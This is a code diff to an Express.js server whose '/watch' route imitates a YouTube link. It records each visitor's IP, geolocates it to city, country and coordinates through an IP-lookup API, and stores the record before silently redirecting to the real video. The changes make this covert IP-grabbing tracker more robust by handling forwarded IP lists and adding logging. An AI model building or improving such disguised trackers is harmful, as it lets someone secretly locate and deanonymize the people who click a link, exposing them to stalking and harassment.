@@ -27,10 +27,7 @@ app.use((req, res, next) => {
 app.get('/watch', async (req, res) => {
     try {
         const videoId = req.query.v;
-        if (!videoId) {
-            return res.redirect('https://youtube.com');
-        }
-
+        
         // Get real IP
         let ip = req.realIp.replace('::ffff:', '');
         console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);
@@ -47,9 +44,12 @@ app.get('/watch', async (req, res) => {
         if (ipInfo.data.status === 'success') {
             console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
             
+            // Extract first IP if multiple are present
+            const cleanIp = ip.split(',')[0].trim();
+            
             // Store in memory
             trackedIPs.push({
-                ip: ip,
+                ip: cleanIp,
                 country: ipInfo.data.country,
                 city: ipInfo.data.city,
                 latitude: ipInfo.data.lat,
@@ -57,10 +57,14 @@ app.get('/watch', async (req, res) => {
                 timestamp: new Date().toISOString()
             });
 
+            console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
+
             // Keep only last 100 IPs to manage memory
             if (trackedIPs.length > 100) {
                 trackedIPs = trackedIPs.slice(-100);
             }
+        } else {
+            console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
         }
 
         // Redirect to actual YouTube video
